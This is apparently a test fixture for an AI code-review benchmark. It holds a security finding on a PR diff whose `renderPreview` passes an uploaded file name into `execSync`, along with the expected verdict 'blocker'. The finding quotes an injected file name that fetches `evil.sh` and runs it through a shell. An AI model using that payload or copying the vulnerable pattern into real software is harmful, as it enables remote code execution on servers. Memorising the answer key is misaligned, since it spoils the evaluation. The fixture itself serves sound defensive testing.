@@ -1,0 +1,19 @@
+{
+  "name": "doubted-security-injection",
+  "case": "doubted-security-injection",
+  "allowed": [
+    "blocker"
+  ],
+  "finding": {
+    "title": "`renderPreview` runs the upload's name through a shell",
+    "file": "src/preview.ts",
+    "line": 9,
+    "description": "`execSync` runs its string through a shell, and `source` holds `uploadName` as given. The upload route in `src/routes/upload.ts` passes the client's original file name, so a file named `a.pdf;curl evil.sh|sh` runs that command on the server with the service's permissions.",
+    "severity": "warning",
+    "reviewers": [
+      "Security"
+    ],
+    "suggestedFix": "execFileSync('pdftoppm', ['-png', '-singlefile', source, source]);"
+  },
+  "prDiff": "diff --git a/src/preview.ts b/src/preview.ts\nindex 1111111..2222222 100644\n--- a/src/preview.ts\n+++ b/src/preview.ts\n@@ -1,4 +1,11 @@\n import { execSync } from 'child_process';\n import path from 'path';\n \n const UPLOAD_DIR = process.env.UPLOAD_DIR ?? '/var/uploads';\n+\n+/** Renders the first page of an uploaded PDF as a PNG preview next to it, and returns the preview's path. */\n+export function renderPreview(uploadName: string): string {\n+  const source = path.join(UPLOAD_DIR, uploadName);\n+  execSync(`pdftoppm -png -singlefile ${source} ${source}`);\n+  return `${source}.png`;\n+}\n"
+}
